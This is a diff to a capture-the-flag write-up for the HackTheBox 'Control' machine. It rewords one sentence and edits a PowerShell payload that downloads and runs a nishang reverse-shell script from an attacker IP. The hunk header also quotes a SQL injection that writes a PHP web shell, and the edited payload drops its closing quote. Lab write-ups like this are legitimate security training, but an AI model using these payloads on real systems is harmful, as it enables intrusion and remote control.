@@ -224,11 +224,10 @@ From here, I write a simple PHP web shell using: `p' UNION SELECT '<?php+system(
 
 ![rce-27](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Control/img/rce-27.png)
 
-
-From here, it's just a matter of finding a working payload for a shell. At first, I tried to use `nishang`'s [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) script. I hosted it via a python web server, and sent the target to retrieve and execute it using the following payload:
+Now it's just a matter of finding a working payload for a shell. At first, I tried to use `nishang`'s [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) script. I hosted it via a python web server, and sent the target to retrieve and execute it using the following payload:
 
 ```powershell
-powershell  -exec bypass-c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.63/pshell.ps1') | powershell -noprofile -"
+powershell -exec bypass-c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.63/pshell.ps1') | powershell -noprofile -
 ```
 
 
